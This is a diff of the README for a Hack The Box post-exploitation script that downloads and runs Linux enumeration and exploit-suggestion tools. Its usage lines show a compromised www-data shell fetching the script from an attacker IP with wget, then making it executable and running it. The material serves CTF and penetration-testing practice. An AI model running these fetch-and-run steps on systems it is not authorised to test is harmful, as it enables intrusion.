@@ -3,6 +3,8 @@
 
 This script is designed for use in situations where you do not have internet access on a Linux host and would like to run enumeration and exploit suggestion scripts, such as Hack The Box. I find myself running a similar set of scripts when I get an initial foothold on a Linux box, and this script helps automate the process of downloading the latest version of each enumeration script, making it executable, and running it, as well as sending output to a file for later review.
 
+**Pull requests/suggestions welcome!**
+
 ### Features
 * 5 different enumeration scripts, including:
     * [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration/)
@@ -64,4 +66,4 @@ www-data@htb:/tmp$ wget http://10.10.99.100/htbenum.sh -O /tmp/htbenum.sh
 www-data@htb:/tmp$ chmod +x ./htbenum.sh
 www-data@htb:/tmp$ ./htbenum.sh 10.10.99.100 80
 ```
-
+Each tool will send its output to a report file in the same directory as the `htbenum.sh` script, or whatever directory is specified by the `directory` parameter.
